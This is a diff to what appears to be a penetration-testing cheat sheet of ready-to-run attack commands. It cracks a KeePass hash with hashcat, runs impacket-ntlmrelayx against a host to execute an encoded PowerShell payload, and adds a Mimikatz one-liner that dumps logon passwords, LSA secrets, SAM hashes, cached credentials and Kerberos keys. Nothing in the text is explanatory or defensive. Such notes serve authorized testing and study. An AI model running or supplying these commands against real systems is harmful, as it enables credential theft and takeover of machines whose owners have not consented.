@@ -170,6 +170,11 @@ keepass2john Database.kdb | grep -o "$keepass$.*" >  CrackThis.hash
 cat keepass.hash
 hashcat --help | grep -i "KeePass"
 hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+Maybe try this wordlist to be faster:
+
+/usr/share/wordlists/fasttrack.txt
+
 ```
 
 ### NTLM
@@ -209,4 +214,12 @@ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
 For the relay do this instead of responder:
 
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+
+
+Mimikatz One-Liner:
+
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "token::elevate" "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM sam.hiv security.hiv system.hiv" "lsadump::cache" "sekurlsa::ekeys" "exit"
+
+
+
 ```
